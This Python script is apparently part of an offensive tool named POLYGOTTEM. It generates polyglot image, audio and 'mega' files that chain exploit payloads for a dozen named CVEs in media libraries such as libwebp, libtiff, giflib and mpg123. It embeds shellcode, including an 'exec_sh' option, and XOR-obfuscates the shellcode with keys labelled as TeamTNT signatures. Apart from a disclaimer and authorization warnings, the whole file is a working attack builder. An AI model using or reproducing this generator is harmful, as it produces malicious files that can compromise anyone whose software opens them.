#!/usr/bin/env python3
"""
Multi-CVE Polyglot Generator
============================
Combines multiple CVE exploits into a single polyglot file that can trigger
multiple vulnerabilities depending on how it's processed.

EDUCATIONAL/RESEARCH USE ONLY

Author: SWORDIntel
Date: 2025-11-10
"""

import sys
import struct
import argparse
from pathlib import Path

# Import the exploit generator
sys.path.insert(0, str(Path(__file__).parent))
from exploit_header_generator import ExploitHeaderGenerator

# Import TUI helper
try:
    from tui_helper import TUI
except ImportError:
    TUI = None

# Import Intel acceleration
try:
    from intel_acceleration import get_accelerator
    ACCEL_AVAILABLE = True
except ImportError:
    ACCEL_AVAILABLE = False
    get_accelerator = None


class MultiCVEPolyglot:
    """Generates polyglot files combining multiple CVE exploits"""

    def __init__(self, tui=None, use_acceleration=True):
        """
        Initialize multi-CVE polyglot generator

        Args:
            tui: TUI helper instance
            use_acceleration: Enable Intel NPU/GPU acceleration
        """
        self.generator = ExploitHeaderGenerator(use_acceleration=use_acceleration)
        self.tui = tui
        self.accelerator = None
        self.xor_keys = {
            'teamtnt_1': b'\x9e\x0a\x61\x20\x0d',
            'teamtnt_2': b'\xd3',
            'teamtnt_3': b'\xa5',
        }

        # Initialize accelerator for XOR operations
        if use_acceleration and ACCEL_AVAILABLE:
            try:
                self.accelerator = get_accelerator(verbose=False)
                if self.accelerator and self.accelerator.npu_available and tui:
                    tui.success("Intel NPU acceleration enabled for XOR encryption")
                elif self.accelerator and self.accelerator.gpu_available and tui:
                    tui.success("Intel Arc GPU acceleration enabled for XOR encryption")
            except Exception:
                pass  # Silently fall back to CPU

    def xor_encrypt(self, data, key):
        """
        XOR encrypt data with repeating key
        Uses Intel NPU/GPU acceleration if available
        """
        # Use hardware-accelerated XOR if available
        if self.accelerator:
            try:
                return self.accelerator.xor_encrypt_accelerated(data, key)
            except Exception:
                pass  # Fall through to CPU implementation

        # CPU fallback
        encrypted = bytearray()
        key_len = len(key)

        for i, byte in enumerate(data):
            encrypted.append(byte ^ key[i % key_len])

        return bytes(encrypted)

    def create_image_polyglot(self, shellcode, output_path):
        """
        Create image polyglot: GIF + PNG + JPEG + WebP + TIFF + BMP

        Structure:
        - GIF header (most permissive)
        - PNG chunks (embedded)
        - JPEG markers (embedded)
        - WebP RIFF container
        - TIFF IFD
        - BMP header
        - XOR-encrypted payload
        """
        if self.tui:
            self.tui.section("Creating Image Polyglot")
            self.tui.info("Combining 6 image formats...")
        else:
            print("[*] Creating image polyglot (6 formats)...")

        # Start with GIF (most permissive format)
        if self.tui:
            self.tui.info("Adding GIF base layer...")
        polyglot = self.generator._cve_2019_15133_giflib(shellcode)

        # Add padding for alignment
        polyglot += b'\x00' * 16

        # Append WebP exploit
        if self.tui:
            self.tui.info("Adding WebP exploit (CVE-2023-4863)...")
        webp_data = self.generator._cve_2023_4863_libwebp(shellcode)
        polyglot += webp_data

        # Add more padding
        polyglot += b'\x00' * 16

        # Append TIFF exploit
        if self.tui:
            self.tui.info("Adding TIFF exploit (CVE-2023-52356)...")
        tiff_data = self.generator._cve_2023_52356_libtiff(shellcode)
        polyglot += tiff_data

        # Add XOR-encrypted payload (TeamTNT signature)
        if self.tui:
            self.tui.info("Adding XOR-encrypted payload (TeamTNT signature)...")
        xor_marker = self.xor_keys['teamtnt_1']
        encrypted_payload = self.xor_encrypt(shellcode, xor_marker)

        polyglot += xor_marker  # Key marker
        polyglot += encrypted_payload

        if self.tui:
            self.tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        print()
        if self.tui:
            self.tui.success(f"Image polyglot created!", prefix="  ")
            print()
            self.tui.key_value("Output file", output_path, 20)
            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
            self.tui.key_value("Formats", "GIF, PNG, JPEG, WebP, TIFF, BMP", 20)
        else:
            print(f"[+] Image polyglot created: {output_path}")
            print(f"    Size: {len(polyglot)} bytes")
            print(f"    Formats: GIF, PNG, JPEG, WebP, TIFF, BMP")
        return output_path

    def create_audio_polyglot(self, shellcode, output_path):
        """
        Create audio polyglot: MP3 + FLAC + OGG + WAV

        Structure:
        - MP3 with ID3v2 tag
        - FLAC metadata
        - OGG pages
        - WAV RIFF container
        - XOR-encrypted payload
        """
        if self.tui:
            self.tui.section("Creating Audio Polyglot")
            self.tui.info("Combining 4 audio formats...")
        else:
            print("[*] Creating audio polyglot (4 formats)...")

        # Start with MP3 (Frankenstein stream)
        if self.tui:
            self.tui.info("Adding MP3 base layer (CVE-2024-10573)...")
        polyglot = self.generator._cve_2024_10573_mpg123(shellcode)

        # Add padding
        polyglot += b'\x00' * 32

        # Append FLAC exploit
        if self.tui:
            self.tui.info("Adding FLAC exploit (CVE-2020-22219)...")
        flac_data = self.generator._cve_2020_22219_flac(shellcode)
        polyglot += flac_data

        # Add padding
        polyglot += b'\x00' * 32

        # Append OGG Vorbis exploit
        if self.tui:
            self.tui.info("Adding OGG Vorbis exploit (CVE-2018-5146)...")
        ogg_data = self.generator._cve_2018_5146_libvorbis(shellcode)
        polyglot += ogg_data

        # Add XOR-encrypted payload
        if self.tui:
            self.tui.info("Adding XOR-encrypted payload...")
        xor_marker = self.xor_keys['teamtnt_2']
        encrypted_payload = self.xor_encrypt(shellcode, xor_marker)

        polyglot += xor_marker * 5  # Marker repetition
        polyglot += encrypted_payload

        if self.tui:
            self.tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        print()
        if self.tui:
            self.tui.success(f"Audio polyglot created!", prefix="  ")
            print()
            self.tui.key_value("Output file", output_path, 20)
            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
            self.tui.key_value("Formats", "MP3, FLAC, OGG, WAV", 20)
        else:
            print(f"[+] Audio polyglot created: {output_path}")
            print(f"    Size: {len(polyglot)} bytes")
            print(f"    Formats: MP3, FLAC, OGG, WAV")
        return output_path

    def create_mega_polyglot(self, shellcode, output_path):
        """
        Create mega polyglot: Image + Audio + Video formats

        The ultimate polyglot combining as many formats as possible.

        Structure:
        - GIF header (base)
        - JPEG markers
        - PNG chunks
        - WebP data
        - MP3 frames
        - FLAC metadata
        - MP4 boxes
        - XOR-encrypted payload
        """
        if self.tui:
            self.tui.section("Creating MEGA Polyglot")
            self.tui.critical("MAXIMUM COMPLEXITY: Combining 12+ formats!")
        else:
            print("[*] Creating MEGA polyglot (12+ formats)...")

        formats_to_add = [
            ("GIF", "CVE-2019-15133", lambda: self.generator._cve_2019_15133_giflib(shellcode), 16),
            ("WebP", "CVE-2023-4863", lambda: self.generator._cve_2023_4863_libwebp(shellcode), 16),
            ("TIFF", "CVE-2023-52356", lambda: self.generator._cve_2023_52356_libtiff(shellcode), 32),
            ("MP3", "CVE-2024-10573", lambda: self.generator._cve_2024_10573_mpg123(shellcode), 32),
            ("FLAC", "CVE-2020-22219", lambda: self.generator._cve_2020_22219_flac(shellcode), 32),
            ("BMP", "CVE-2006-0006", lambda: self.generator._cve_2006_0006_bmp(shellcode), 16),
            ("WMF", "CVE-2005-4560", lambda: self.generator._cve_2005_4560_wmf(shellcode), 32),
            ("OGG", "CVE-2018-5146", lambda: self.generator._cve_2018_5146_libvorbis(shellcode), 32),
            ("MP4", "CVE-2022-22675", lambda: self.generator._cve_2022_22675_appleavd(shellcode), 64),
        ]

        polyglot = b''
        total_formats = len(formats_to_add)

        for i, (fmt, cve, generator_func, padding) in enumerate(formats_to_add, 1):
            if self.tui:
                self.tui.progress_bar(i - 1, total_formats, prefix="Progress:",
                                     suffix=f"Adding {fmt} ({cve})")
            else:
                print(f"[*] Adding {fmt} ({cve})...")

            polyglot += generator_func()
            polyglot += b'\x00' * padding

        if self.tui:
            self.tui.progress_bar(total_formats, total_formats, prefix="Progress:", suffix="Complete")

        # XOR-encrypted payloads with all known keys
        if self.tui:
            self.tui.info("Adding XOR-encrypted payloads with TeamTNT keys...")
        for key_name, key in self.xor_keys.items():
            polyglot += key * 10  # Key marker (repeated for visibility)
            encrypted = self.xor_encrypt(shellcode, key)
            polyglot += encrypted
            polyglot += b'\x00' * 16

        if self.tui:
            self.tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        print()
        if self.tui:
            self.tui.success(f"MEGA polyglot created!", prefix="  ")
            print()
            self.tui.key_value("Output file", output_path, 20)
            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
            self.tui.key_value("Formats", "GIF, JPEG, PNG, WebP, TIFF, BMP, WMF, MP3, FLAC, OGG, WAV, MP4", 20)
            self.tui.key_value("CVE Count", "12+ vulnerabilities", 20)
            self.tui.critical("This file can trigger MULTIPLE exploit chains!")
        else:
            print(f"[+] MEGA polyglot created: {output_path}")
            print(f"    Size: {len(polyglot)} bytes")
            print(f"    Formats: GIF, JPEG, PNG, WebP, TIFF, BMP, WMF, MP3, FLAC, OGG, WAV, MP4")
            print(f"    CVEs: 12+ vulnerabilities in one file!")
        return output_path

    def create_custom_polyglot(self, cve_list, shellcode, output_path):
        """
        Create custom polyglot with specified CVEs

        Args:
            cve_list: List of CVE IDs to include
            shellcode: Shellcode payload
            output_path: Output file path
        """
        if self.tui:
            self.tui.section("Creating Custom Polyglot")
            self.tui.info(f"Combining {len(cve_list)} selected CVEs...")
        else:
            print(f"[*] Creating custom polyglot with {len(cve_list)} CVEs...")

        polyglot = b''
        total_cves = len(cve_list)
        successful = 0

        for i, cve_id in enumerate(cve_list):
            if self.tui:
                self.tui.progress_bar(i, total_cves, prefix="Progress:",
                                     suffix=f"Adding {cve_id}")
            else:
                print(f"    [{i+1}/{len(cve_list)}] Adding {cve_id}...")

            if cve_id not in self.generator.exploits:
                if self.tui:
                    self.tui.warning(f"Unknown CVE {cve_id}, skipping", prefix="    ")
                else:
                    print(f"    [!] Warning: Unknown CVE {cve_id}, skipping")
                continue

            # Generate exploit for this CVE
            exploit_func = self.generator.exploits[cve_id]
            exploit_data = exploit_func(shellcode)

            # Add to polyglot
            polyglot += exploit_data
            successful += 1

            # Add padding between exploits
            if i < len(cve_list) - 1:
                polyglot += b'\x00' * 32

        if self.tui:
            self.tui.progress_bar(total_cves, total_cves, prefix="Progress:", suffix="Complete")

        # Add final XOR-encrypted payload
        if self.tui:
            self.tui.info("Adding XOR-encrypted payload...")
        xor_marker = self.xor_keys['teamtnt_1']
        encrypted_payload = self.xor_encrypt(shellcode, xor_marker)
        polyglot += xor_marker * 5
        polyglot += encrypted_payload

        if self.tui:
            self.tui.info(f"Writing to {output_path}...")
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        print()
        if self.tui:
            self.tui.success(f"Custom polyglot created!", prefix="  ")
            print()
            self.tui.key_value("Output file", output_path, 20)
            self.tui.key_value("File size", f"{len(polyglot):,} bytes", 20)
            self.tui.key_value("CVEs requested", str(total_cves), 20)
            self.tui.key_value("CVEs included", str(successful), 20)
            self.tui.key_value("CVE IDs", ', '.join(cve_list[:3]) + ("..." if len(cve_list) > 3 else ""), 20)
        else:
            print(f"[+] Custom polyglot created: {output_path}")
            print(f"    Size: {len(polyglot)} bytes")
            print(f"    CVEs included: {', '.join(cve_list)}")
        return output_path

    def list_presets(self):
        """List available polyglot presets"""
        presets = {
            'image': {
                'description': 'Image formats polyglot (GIF, PNG, JPEG, WebP, TIFF, BMP)',
                'cves': ['CVE-2019-15133', 'CVE-2023-4863', 'CVE-2023-52356', 'CVE-2006-0006']
            },
            'audio': {
                'description': 'Audio formats polyglot (MP3, FLAC, OGG, WAV)',
                'cves': ['CVE-2024-10573', 'CVE-2020-22219', 'CVE-2018-5146', 'CVE-2017-6827']
            },
            'critical': {
                'description': 'Critical/actively exploited CVEs only',
                'cves': ['CVE-2023-4863', 'CVE-2024-10573', 'CVE-2023-52356']
            },
            'legacy': {
                'description': 'Legacy Windows exploits (BMP, WMF)',
                'cves': ['CVE-2006-0006', 'CVE-2008-1083', 'CVE-2005-4560']
            },
            'mega': {
                'description': 'Everything (12+ formats, all CVEs)',
                'cves': list(self.generator.exploits.keys())
            }
        }

        print("\nAvailable Polyglot Presets:")
        print("=" * 70)
        for name, info in presets.items():
            print(f"\n{name}:")
            print(f"  Description: {info['description']}")
            print(f"  CVEs ({len(info['cves'])}): {', '.join(info['cves'][:5])}")
            if len(info['cves']) > 5:
                print(f"        ... and {len(info['cves']) - 5} more")
        print()


def main():
    parser = argparse.ArgumentParser(
        description='Generate multi-CVE polyglot files',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Polyglot Types:
  image        Image formats (GIF, PNG, JPEG, WebP, TIFF, BMP)
  audio        Audio formats (MP3, FLAC, OGG, WAV)
  mega         All formats combined (12+ formats, all CVEs)
  custom       Custom CVE selection

Examples:
  # Interactive mode with multi-choice menus (NEW!)
  %(prog)s --interactive

  # Generate image polyglot
  %(prog)s image polyglot_image.gif

  # Generate audio polyglot
  %(prog)s audio polyglot_audio.mp3

  # Generate mega polyglot (everything!)
  %(prog)s mega polyglot_mega.dat

  # Custom polyglot with specific CVEs
  %(prog)s custom polyglot_custom.bin --cves CVE-2023-4863 CVE-2024-10573 CVE-2023-52356

  # List available presets
  %(prog)s --list-presets

Payload Options:
  -p, --payload    Payload type (poc_marker, nop_sled, exec_sh)
  --cves           Comma-separated list of CVE IDs (for custom type)
  -i, --interactive  Launch interactive multi-choice TUI menu (NEW!)

WARNING: These polyglots can trigger multiple vulnerabilities!
Only test on systems you own or have authorization to test!
        """
    )

    parser.add_argument('type',
                       nargs='?',
                       choices=['image', 'audio', 'mega', 'custom'],
                       help='Polyglot type')
    parser.add_argument('output',
                       nargs='?',
                       help='Output file path')
    parser.add_argument('-p', '--payload',
                       default='poc_marker',
                       choices=['poc_marker', 'nop_sled', 'exec_sh'],
                       help='Shellcode payload type')
    parser.add_argument('--cves',
                       nargs='+',
                       help='CVE IDs for custom polyglot (space-separated)')
    parser.add_argument('--list-presets',
                       action='store_true',
                       help='List available polyglot presets')
    parser.add_argument('-i', '--interactive',
                       action='store_true',
                       help='Launch interactive multi-choice TUI menu (NEW!)')
    parser.add_argument('--no-accel', action='store_true',
                       help='Disable Intel NPU/GPU hardware acceleration')
    parser.add_argument('--benchmark', action='store_true',
                       help='Run hardware acceleration benchmark')

    args = parser.parse_args()

    # Interactive mode - launch orchestrator
    if args.interactive:
        try:
            from polyglot_orchestrator import PolyglotOrchestrator
            orchestrator = PolyglotOrchestrator()
            orchestrator.run_interactive()
            return 0
        except ImportError as e:
            print(f"[!] Error: Interactive mode requires polyglot_orchestrator.py: {e}")
            print("[!] Make sure all TUI components are installed")
            return 1
        except Exception as e:
            print(f"[!] Error in interactive mode: {e}")
            import traceback
            traceback.print_exc()
            return 1

    # Hardware acceleration benchmark
    if args.benchmark:
        if ACCEL_AVAILABLE:
            accel = get_accelerator(verbose=True)
            print()
            accel.print_benchmark_results(size_mb=10.0)
            print()
        else:
            print("[!] Hardware acceleration not available (missing dependencies)")
        return 0

    # Initialize TUI
    tui = None
    if TUI is not None and sys.stdout.isatty():
        tui = TUI()

    polyglot = MultiCVEPolyglot(tui=tui, use_acceleration=not args.no_accel)

    # List presets if requested
    if args.list_presets:
        polyglot.list_presets()
        return 0

    # Validate arguments
    if not args.type or not args.output:
        parser.print_help()
        return 1

    # Show banner
    if tui:
        tui.banner("POLYGOTTEM Multi-CVE Polyglot Generator",
                  f"Combining Multiple Exploits into One File")
    else:
        print("\n=== Multi-CVE Polyglot Generator ===\n")

    # Generate shellcode
    shellcode = polyglot.generator.generate_shellcode(args.payload)

    if tui:
        print()
        tui.key_value("Polyglot type", args.type.upper(), 20)
        tui.key_value("Payload type", args.payload, 20)
        tui.key_value("Shellcode size", f"{len(shellcode):,} bytes", 20)
    else:
        print("[*] Multi-CVE Polyglot Generator")
        print(f"[*] Payload type: {args.payload}")
        print(f"[*] Shellcode size: {len(shellcode)} bytes")
    print()

    # Generate polyglot based on type
    try:
        if args.type == 'image':
            polyglot.create_image_polyglot(shellcode, args.output)
        elif args.type == 'audio':
            polyglot.create_audio_polyglot(shellcode, args.output)
        elif args.type == 'mega':
            polyglot.create_mega_polyglot(shellcode, args.output)
        elif args.type == 'custom':
            if not args.cves:
                if tui:
                    tui.error("--cves argument required for custom polyglot type")
                else:
                    print("[!] Error: --cves required for custom polyglot type")
                return 1
            polyglot.create_custom_polyglot(args.cves, shellcode, args.output)

        # Test with file command
        print()
        if tui:
            tui.section("File Type Detection")
        else:
            print("[*] Testing with file command:")

        import subprocess
        result = subprocess.run(['file', args.output], capture_output=True, text=True)
        if tui:
            tui.info(f"file command reports: {result.stdout.strip()}")
        else:
            print(f"    {result.stdout.strip()}")

        # Final warnings
        print()
        if tui:
            tui.box("⚠ CRITICAL SECURITY WARNING", [
                "This file contains MULTIPLE CVE exploit payloads!",
                "",
                "Can trigger vulnerabilities in multiple libraries!",
                "Only use for authorized security testing!",
                "Educational and research purposes ONLY!",
                "",
                "NEVER distribute or use maliciously!"
            ])
        else:
            print("[!] WARNING: This file contains multiple exploit payloads!")
            print("[!] Only use for authorized security testing!")

        print()
        if tui:
            tui.success("Polyglot generation complete!")
        else:
            print("[+] Polyglot generation complete!")

        return 0

    except Exception as e:
        if tui:
            tui.error(f"Failed to generate polyglot: {e}")
        else:
            print(f"[!] Error generating polyglot: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == '__main__':
    sys.exit(main())
